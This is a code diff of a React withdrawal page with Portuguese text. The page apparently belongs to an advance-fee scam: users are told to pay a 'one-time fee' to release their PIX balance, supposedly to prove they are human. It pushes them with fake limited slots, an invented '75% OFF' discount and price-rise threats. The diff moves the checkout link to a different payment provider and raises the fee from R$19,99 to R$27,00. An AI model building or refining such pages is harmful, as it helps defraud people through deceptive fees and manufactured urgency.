@@ -78,10 +78,10 @@ export default function WithdrawPage() {
       }
     }
 
-    // Redirecionar para a página de checkout LiraPay com UTMs
+    // Redirecionar para a página de checkout MundPay com UTMs
     const activationUrl = utmParams
-      ? `https://pay.lirapaybr.com/kXDMYrBG?${utmParams}`
-      : "https://pay.lirapaybr.com/kXDMYrBG"
+      ? `https://pay.mundpay.com/01985d25-baa2-7213-9f1c-a96b491b23d8?ref=&${utmParams}`
+      : "https://pay.mundpay.com/01985d25-baa2-7213-9f1c-a96b491b23d8?ref="
 
     window.location.href = activationUrl
   }
@@ -314,7 +314,9 @@ export default function WithdrawPage() {
                     <div>
                       <h3 className="font-semibold mb-2 sm:text-base text-base">🔒 Por que existe uma taxa?</h3>
                       <p className="text-xs sm:text-sm opacity-90 leading-relaxed">
-                        {"Para garantir a segurança do sistema e liberar seu saldo com total confiabilidade, é necessário o pagamento de uma taxa única. Essa medida serve para validar que você é uma pessoa real e não um robô, além de proteger os saques via PIX contra fraudes e acessos indevidos.\nCom ela, conseguimos manter o ambiente 100% seguro e a plataforma sustentável para todos."}
+                        {
+                          "Para garantir a segurança do sistema e liberar seu saldo com total confiabilidade, é necessário o pagamento de uma taxa única. Essa medida serve para validar que você é uma pessoa real e não um robô, além de proteger os saques via PIX contra fraudes e acessos indevidos.\nCom ela, conseguimos manter o ambiente 100% seguro e a plataforma sustentável para todos."
+                        }
                       </p>
                     </div>
                   </div>
@@ -335,22 +337,22 @@ export default function WithdrawPage() {
                       style={{ width: `${(remainingSlots / 10) * 100}%` }}
                     ></div>
                   </div>
-                  <p className="text-xs opacity-75 text-center">⚠️ Após esgotar, a taxa volta para R$ 79,90</p>
+                  <p className="text-xs opacity-75 text-center">⚠️ Após esgotar, a taxa volta para R$ 99,90</p>
                 </div>
 
                 {/* Price Comparison */}
                 <div className="text-center mb-4 sm:mb-6">
                   <div className="flex items-center justify-center space-x-2 sm:space-x-4 mb-3 sm:mb-4">
-                    <span className="text-lg sm:text-2xl line-through opacity-60">R$ 79,90</span>
+                    <span className="text-lg sm:text-2xl line-through opacity-60">R$ 99,90</span>
                     <div className="flex items-center space-x-2">
-                      <span className="text-3xl sm:text-4xl lg:text-5xl font-bold">R$ 19,99</span>
+                      <span className="text-3xl sm:text-4xl lg:text-5xl font-bold">R$ 27,00</span>
                       <div className="bg-yellow-400 text-black px-2 py-1 sm:px-3 sm:py-1 rounded-full font-bold text-xs sm:text-sm">
                         75% OFF
                       </div>
                     </div>
                   </div>
                   <div className="bg-primary/20 rounded-lg p-2 sm:p-3 mb-4">
-                    <p className="text-sm sm:text-lg font-semibold text-primary/80">💰 Você economiza R$ 59,91</p>
+                    <p className="text-sm sm:text-lg font-semibold text-primary/80">💰 Você economiza R$ 72,90</p>
                   </div>
                 </div>
 
@@ -360,7 +362,7 @@ export default function WithdrawPage() {
                   className="w-full bg-white text-destructive hover:bg-gray-100 py-3 sm:py-4 text-base sm:text-xl font-bold mb-3 sm:mb-4 h-12 sm:h-16 shadow-lg hover:shadow-xl transition-all duration-200 transform hover:scale-[1.02]"
                 >
                   <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-                  ATIVAR CONTA - R$ 19,99
+                  ATIVAR CONTA - R$ 27,00
                 </Button>
 
                 {/* Final Urgency */}
@@ -381,7 +383,7 @@ export default function WithdrawPage() {
               </div>
               <div className="grid grid-cols-3 gap-2 sm:gap-4 text-center">
                 <div className="bg-destructive/10 rounded-lg p-2 sm:p-3">
-                  <div className="text-lg sm:text-2xl font-bold text-destructive">R$ 19,99</div>
+                  <div className="text-lg sm:text-2xl font-bold text-destructive">R$ 27,00</div>
                   <div className="text-xs sm:text-sm text-muted-foreground">Investimento único</div>
                 </div>
                 <div className="bg-accent/10 rounded-lg p-2 sm:p-3">
